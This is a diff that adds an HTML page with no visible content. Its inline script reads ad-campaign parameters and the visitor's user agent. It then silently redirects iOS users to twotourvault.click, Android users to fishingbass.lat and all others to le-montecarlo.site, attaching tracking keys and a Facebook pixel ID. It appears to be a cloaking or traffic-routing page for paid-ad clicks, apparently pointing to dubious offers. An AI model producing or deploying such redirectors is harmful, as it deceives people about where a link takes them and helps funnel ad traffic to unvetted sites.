@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<script>
+(function(){
+  var ua = navigator.userAgent || navigator.vendor;
+  var params    = new URLSearchParams(window.location.search);
+
+  var creo      = params.get('creo')      || '';
+  var placement = params.get('placement') || '';
+  var campaign  = params.get('campaign')  || '';
+  var adset     = params.get('adset')     || '';
+  var ad        = params.get('ad')        || '';
+  var account   = params.get('account')   || '';
+  var fbclid    = params.get('fbclid')    || '';
+
+  var Android_URL = 'https://fishingbass.lat/'
+    + '?sub2='  + creo
+    + '&sub6=dc243f8f70824f0590a7209b090b2f79'
+    + '&sub5='  + placement
+    + '&sub8='  + account
+    + '&sub12=' + campaign
+    + '&sub13=' + adset
+    + '&sub14=' + ad
+    + '&sub1=076'
+    + '&fb_pixel=1558471915839270';
+
+var iOS_URL = 'https://ec.twotourvault.click/'
+    + '?t2='  + creo
+    + '&key=5581ce18e9694d298c4becd2b07f05cb'
+    + '&t5='  + placement
+    + '&t8='  + account
+    + '&t12=' + campaign
+    + '&t13=' + adset
+    + '&t14=' + ad
+    + '&t1=076'
+    + '&p=1558471915839270';
+
+  var Fallback_URL = 'https://le-montecarlo.site/';
+
+  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+    window.location.replace(iOS_URL);
+  } else if (/android/i.test(ua)) {
+    window.location.replace(Android_URL);
+  } else {
+    window.location.replace(Fallback_URL);
+  }
+})();
+</script>
+</head>
+<body></body>
+</html>
